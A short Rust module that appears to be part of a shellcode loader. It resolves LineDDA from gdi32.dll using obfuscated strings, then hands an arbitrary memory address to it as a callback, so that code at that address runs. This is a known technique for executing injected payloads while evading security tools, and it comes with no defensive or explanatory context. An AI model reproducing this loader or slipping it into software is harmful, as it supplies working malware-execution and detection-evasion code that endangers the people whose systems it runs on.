use obfstr::{obfbytes, obfstr};
pub unsafe fn exec(p: usize) -> Result<(), String> {
    use crate::utils::{load_library, get_proc_address};
    use std::mem::transmute;

    let gdi32 = load_library(obfbytes!(b"gdi32.dll\0").as_slice())?;
    let p_linedda = get_proc_address(gdi32, obfbytes!(b"LineDDA\0").as_slice())?;

    type LineDDAFn = unsafe extern "system" fn(i32, i32, i32, i32, unsafe extern "system" fn(i32, i32, isize), isize) -> i32;
    let linedda: LineDDAFn = transmute(p_linedda);

    let ret = linedda(0, 0, 1, 1, transmute(p), 0);
    if ret == 0 {
        return Err(obfstr!("LineDDA failed").to_string());
    }
    Ok(())
}